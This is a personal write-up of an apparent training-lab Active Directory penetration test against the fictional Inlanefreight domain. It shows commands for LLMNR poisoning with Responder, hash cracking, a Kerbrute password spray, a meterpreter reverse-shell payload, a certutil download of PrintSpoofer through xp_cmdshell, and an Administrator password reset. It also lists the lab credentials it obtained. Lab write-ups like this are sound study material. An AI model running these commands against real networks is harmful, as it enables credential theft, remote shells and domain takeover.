
## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

----
## Recon

To obtain a **NTLM** hash i used the **responder** tool
```bash
responder -I ens24 -wrf
```

- `-I`: indicate which network interface we'll be use
- `-w`: Start the WPAD rogue proxy server. Default value is Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)
- `-r`: Enable answers for **netbios** wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False
- `-f`: `--fingerprint` This option allows you to fingerprint a host that
- `-v`: Increase verbosity of log

![[Pasted image 20250517150618.png]]

In this case we achieve the NTLMv2 hash of **AB920** user for **172.16.7.3** client.
Now i try to crack this NTLMv2 hash using netcat with module `5600`
```bash
sudo hashcat -m 5600 NTLM_hash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20250517151010.png]]
Now i have this credential

| **Client** | **User** | **Password** |
| ---------- | -------- | ------------ |
| 172.16.7.3 | AB920    | weasal       |

Using nmap i try to enumerate entire subnet
```bash
nmap -A 172.16.7.0/24 -Ao nmap_scan
```

I found three IP 
```text
172.16.7.3  DC01
172.16.7.50 MS01
172.16.7.60 SQL01
```

-----
## Foothold

I need to access in the `MS01` server (172.16.7.50). Enumerating more deep the 172.16.7.50 ip i found two method to try the foothold.
1) The `3389` port is open this means we can try to access in the server with `RDP` protocol
```bash
export DISPLAY=:0
ssh -X user@remote_host
xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 /dynamic-resolution
```

2) The `5985` port is open this means we can try to access in the server with `winrm` protocol
```bash
crackmapexec winrm -u AB920 -p weasal -d INLANEFREIGHT 172.16.7.50
```

----
## Password Spray Attack

Download the `Kerbrute` and `PowerView.ps1` tools in the attack machine
```bash
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

Now i need to copy this tool in the machine where i have the SSH session.
```bash
scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

To transfer this tools in the `MS01` machine we can use the shared folder in the machine. To crate the shared folder on the victim machine use 
```shell
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop
```

![[Pasted image 20250519000719.png]]

I started the meterpreter shell to have more stable sessions on the compromise machine
1) Create a meterpreter shell `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4466 -f exe > meterpreter_shell.exe`
2) Use the `multi/handler` module
3) Connect with RDP using `xfreerdp` and `/drive:share` flag
4) Copy the .exe file on the desktop of victim machine
5) Start the .exe file
![[Pasted image 20250519001250.png]]

Now using `PowerView` i need to crate a valid users list

```powershell
cd .\Desktop\
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
Get-Content .\adusers.txt | select -First 10
```

![[Pasted image 20250519002018.png]]

Using `kerbrute` i preform the passwordSpray attack with `Welcome1` stupid password

```bash
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adUsers.txt Welcome1
```

![[Pasted image 20250519002429.png]]


| User  | Password |
| ----- | -------- |
| BR086 | Welcome1 |

---
## Privilege Escalation

First all i need to put the `Snaffler.exe` tool on the victim machine. I can use the same technique used with `Kerbrute`
```shell
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe

scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

![[Pasted image 20250519003745.png]]

Now i try to run Snaffler as new user founded `BR086` i can achieve this with `runas` on powershell

```powershell
runas /netonly /user:INLANEFREIGHT\BR086 powershell
```


Now that i have impersonate the `BR086` can i launch the `snaffler` exe

![[Pasted image 20250519012921.png]]


| user  | password         |
| ----- | ---------------- |
| netdb | D@ta_bAse_adm1n! |

With this credential is possible access to the `172.16.7.60` SQL server machine. In this case i used the `mssqlclient.py` tool
```bash
mssqlclient.py INLANEFREIGHT/netdb:D@ta_bAse_adm1n\!@172.16.7.60
```

using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trough **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
![[Pasted image 20250519013904.png]]

Firs alll download and copy on attack machine
```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop

```

now activate the `python3 -m http.server` on the ssh attack machine and download on th `SQL01` machine with the following command
```bash
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```

![[Pasted image 20250519014508.png]]

now i change the password for **Administrator** account in to `Welcome1`.

```sql
xp_cmdshell windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

![[Pasted image 20250519014658.png]]

now using `smbclient` can i access as local user administrator and get the flag

```bash
smbclient -U administrator \\\\172.16.7.60\\C$
```

![[Pasted image 20250519015347.png]]

or using `crackmapexec` with `--local-auth` flag

```bash
crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --get-file 'Users\Administrator\Desktop\flag.txt' flag2.txt
```

![[Pasted image 20250519020119.png]]

